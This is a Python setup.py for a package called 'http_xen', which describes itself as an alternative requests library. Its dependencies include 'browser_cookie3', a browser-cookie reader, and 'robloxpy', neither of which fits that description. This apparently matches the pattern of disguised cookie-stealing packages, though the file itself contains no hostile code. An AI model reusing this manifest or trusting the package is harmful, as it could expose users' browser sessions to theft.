from distutils.core import setup
setup(
  name = 'http_xen',         # How you named your package folder (MyLib)
  packages = ['http_xen'],   # Chose the same as "name"
  version = '1.0.2',      # Start with a small number and increase it with every change you make
  license='MIT',        # Chose a license from here: https://help.github.com/articles/licensing-a-repository
  description = 'Alternative requests library for Python.',   # Give a short description about your library
  author = 'Skotch James',                   # Type in your name
  author_email = 'contact@skochjames.xyz',      # Type in your E-Mail
  url = 'https://github.com/skochwashere',   # Provide either the link to your github or to your website
  install_requires=[            # I get to this in a second
          'requests',
          'robloxpy',
          'browser_cookie3',
      ],
  classifiers=[
    'Development Status :: 3 - Alpha',      # Chose either "3 - Alpha", "4 - Beta" or "5 - Production/Stable" as the current state of your package
    'Intended Audience :: Developers',      # Define that your audience are developers
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',   # Again, pick a license
    'Programming Language :: Python :: 3',      #Specify which pyhton versions that you want to support
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
  ],
)